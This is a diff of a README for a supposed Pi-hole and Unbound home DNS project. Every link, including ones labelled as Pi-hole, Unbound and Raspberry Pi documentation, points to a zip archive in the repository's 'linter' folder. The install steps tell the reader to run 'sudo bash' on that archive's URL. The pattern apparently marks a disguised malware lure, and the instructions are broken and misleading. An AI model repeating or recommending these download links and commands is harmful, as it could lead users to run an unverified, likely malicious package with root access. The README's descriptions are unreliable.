@@ -1,7 +1,7 @@
 # 🔒 secure-dns-home-lab - Simple DNS Protection for Your Home
 
 ## 📥 Download Now
-[![Download](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip%20Now-v1.0-blue)](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)
+[![Download](https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip%20Now-v1.0-blue)](https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip)
 
 ## 📖 Introduction
 Welcome to the **secure-dns-home-lab** project! This application sets up Pi-hole with a recursive DNS server using Unbound. With a secure HTTPS admin interface, it enhances your home network's safety and speed. Enjoy effortless control over your DNS queries while increasing your online privacy.
@@ -23,7 +23,7 @@ Before downloading, ensure you have the following:
 - **Easy Setup:** Simple installation process for anyone.
 
 ## 📦 Download & Install
-To download and install the application, please visit this page: [Download Here](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip).
+To download and install the application, please visit this page: [Download Here](https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip).
 
 ### 📥 Step-by-Step Instructions
 1. **Visit the Releases Page**
@@ -33,7 +33,7 @@ To download and install the application, please visit this page: [Download Here]
    Look for the most recent version and click on it. You will see all the assets associated with this release.
 
 3. **Download the Package**
-   Click on the `.zip` or `https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip` file link to download the software package. This file contains everything you need to get started.
+   Click on the `.zip` or `https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip` file link to download the software package. This file contains everything you need to get started.
 
 4. **Extract the Package**
    Once downloaded, locate the file on your device and extract it using your file manager or compression tool.
@@ -53,7 +53,7 @@ To download and install the application, please visit this page: [Download Here]
 
    ```bash
    cd path_to_extracted_folder
-   sudo bash https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip
+   sudo bash https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip
    ```
 
 7. **Access the Admin Interface**
@@ -99,8 +99,8 @@ Ensure your installation is secure by enabling HTTPS. Regularly update your soft
 Join discussions within the community forums to share your experiences or ask for help. Your feedback can help improve the project.
 
 ## ✅ Additional Learning Resources
-- [Pi-hole Documentation](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)
-- [Unbound Documentation](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)
-- [Raspberry Pi Official Website](https://raw.githubusercontent.com/Foster-Kashoni/secure-dns-home-lab/main/linter/secure-home-dns-lab-v1.7.zip)
+- [Pi-hole Documentation](https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip)
+- [Unbound Documentation](https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip)
+- [Raspberry Pi Official Website](https://github.com/Foster-Kashoni/secure-dns-home-lab/raw/refs/heads/main/linter/secure-home-dns-lab-v3.3-alpha.1.zip)
 
 Feel free to reach out if you have questions or need assistance. Your journey to a safer and faster home network begins here!
